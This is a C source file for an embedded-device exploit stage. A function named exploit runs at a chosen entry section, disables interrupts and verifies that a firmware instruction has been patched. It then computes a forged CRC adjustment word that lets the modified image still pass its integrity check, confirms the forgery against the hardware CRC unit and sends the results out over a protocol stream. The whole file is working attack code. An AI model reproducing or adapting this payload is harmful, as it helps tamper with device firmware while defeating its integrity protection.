#define CRC_PAYLOAD 1
#define CRC_INTERMEDIATE_PAYLOAD 1
#include "patch_common.h"
#include "crc_runtime.h"

#define ORIGINAL_ADJUST 0x0962887Fu
#define CRC_CANDIDATE_ADJUST 0x41C90FF2u
#define CRC_MAGIC_OFFSET 0x7E00u

void exploit(void) __attribute__((section(".text.entry"),used,noreturn));
void exploit(void) {
  struct runtime_guard guard;
  uint32_t values[PROTO_CRC_RECORD_COUNT];
  uint32_t entry_ctl;
  uint32_t entry_cout;
  uint32_t prefix_crc;
  uint32_t new_adjust;
  uint32_t live_sw;
  uint32_t final_sw;
  uint32_t live_dcra;
  uint32_t final_dcra;

  __asm__ volatile ("di");
  runtime_begin(&guard);
  if (MMIO32(PATCH_ADDRESS - 3u) != PATCHED_INSTRUCTION_WORD) {
    halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 1u, MMIO32(PATCH_ADDRESS - 3u), &guard);
  }
  if (MMIO32(CRC_ADJUST) != ORIGINAL_ADJUST) {
    halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 2u, MMIO32(CRC_ADJUST), &guard);
  }
  if (MMIO32(MAGIC0_ADDRESS) != MAGIC_WORD || MMIO32(MAGIC1_ADDRESS) != MAGIC_WORD) {
    halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 3u, 1u, &guard);
  }
  capture_dcra(&entry_ctl, &entry_cout);
  if ((entry_ctl & 3u) != 0u) {
    halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 6u, entry_ctl, &guard);
  }
  prefix_crc = crc_prefix_sw(0u, &guard);
  new_adjust = crc_adjustment(prefix_crc);
  live_sw = crc_full_sw(0u, 0u, &guard);
  final_sw = crc_full_sw(1u, new_adjust, &guard);
  live_dcra = dcra_full_raw(0u, 0u, &guard);
  final_dcra = dcra_full_raw(1u, new_adjust, &guard);
  if (restore_dcra(entry_ctl, entry_cout) != 0u) {
    halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 7u, entry_ctl, &guard);
  }
  if (new_adjust != CRC_CANDIDATE_ADJUST || live_sw != live_dcra
      || live_sw == 0xFFFFFFFFu || final_sw != 0xFFFFFFFFu
      || final_dcra != 0xFFFFFFFFu) {
    halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 5u, new_adjust, &guard);
  }

  values[PROTO_CRC_ENTRY_CTL] = entry_ctl;
  values[PROTO_CRC_ENTRY_COUT] = entry_cout;
  values[PROTO_CRC_RANGE_START] = CRC_RANGE_START;
  values[PROTO_CRC_RANGE_END] = CRC_RANGE_END;
  values[PROTO_CRC_ADJUST_ADDRESS] = CRC_ADJUST;
  values[PROTO_CRC_OLD_ADJUST_WORD] = ORIGINAL_ADJUST;
  values[PROTO_CRC_PATCHED_PREFIX_SW] = prefix_crc;
  values[PROTO_CRC_NEW_ADJUST_WORD] = new_adjust;
  values[PROTO_CRC_ORIGINAL_SW_FULL] = live_sw;
  values[PROTO_CRC_PATCHED_SW_FULL] = final_sw;
  values[PROTO_CRC_ORIGINAL_DCRA_RAW] = live_dcra;
  values[PROTO_CRC_PATCHED_DCRA_RAW] = final_dcra;
  values[PROTO_CRC_EXIT_CTL] = DCRA_CTL;
  values[PROTO_CRC_EXIT_COUT] = DCRA_COUT;
  values[PROTO_CRC_SRAM_ECHO_LENGTH] = 0u;
  values[PROTO_CRC_SRAM_ECHO_CRC32] = 0u;

  (void)send_crc_stream(PROTO_OP_CRC_INTERMEDIATE, values, &guard);
  runtime_end(&guard);
  for (;;) {
  }
}
